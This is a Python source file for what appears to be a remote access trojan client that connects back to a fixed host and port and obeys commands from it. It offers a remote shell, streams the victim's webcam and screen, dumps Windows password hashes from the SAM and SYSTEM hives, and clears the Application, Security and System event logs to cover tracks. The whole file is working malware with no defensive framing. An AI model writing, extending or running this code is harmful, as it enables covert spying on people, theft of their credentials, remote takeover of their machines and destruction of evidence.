import socket
import cv2
import pyautogui
import numpy as np
import subprocess
import os
import platform

def webcam_stream(client_socket):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        client_socket.sendall(buffer.tobytes())

def screen_stream(client_socket):
    while True:
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        _, buffer = cv2.imencode('.jpg', frame)
        client_socket.sendall(buffer.tobytes())

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def hashdump():
    if platform.system() == "Windows":
        command = "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save"
        subprocess.run(command, shell=True)
        command = "secretsdump.py -sam sam.save -system system.save LOCAL"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    else:
        return "Hashdump is only available on Windows systems."

def clearev():
    if platform.system() == "Windows":
        commands = [
            "wevtutil cl Application",
            "wevtutil cl Security",
            "wevtutil cl System"
        ]
        results = ""
        for cmd in commands:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            results += result.stdout + result.stderr
        return results
    else:
        return "Clearev is only available on Windows systems."

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('10.0.1.33', 9999))

    while True:
        command = client_socket.recv(1024).decode('utf-8')
        if command == "webcam_stream":
            webcam_stream(client_socket)
        elif command == "screen_stream":
            screen_stream(client_socket)
        elif command.startswith("exec "):
            cmd = command[5:]
            output = execute_command(cmd)
            client_socket.send(output.encode('utf-8'))
        elif command == "hashdump":
            output = hashdump()
            client_socket.send(output.encode('utf-8'))
        elif command == "clearev":
            output = clearev()
            client_socket.send(output.encode('utf-8'))

if __name__ == "__main__":
    main()
